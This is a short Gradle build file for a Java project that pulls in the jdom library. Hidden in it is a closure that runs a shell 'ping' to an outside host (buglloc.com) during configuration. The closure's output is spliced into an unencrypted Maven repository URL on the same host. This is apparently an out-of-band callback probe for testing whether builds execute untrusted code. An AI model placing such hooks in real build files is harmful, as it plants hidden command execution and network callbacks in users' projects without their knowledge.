apply plugin: 'java'

def test = { ->
    exec {
        commandLine "ping", "-c", "1", "221231223.z.buglloc.com"
    }
}

repositories {
  maven {
    url 'http://test11.z.buglloc.com/' + test()
  }
}

dependencies {

  compile 'org.jdom:jdom:1.1.3'
}
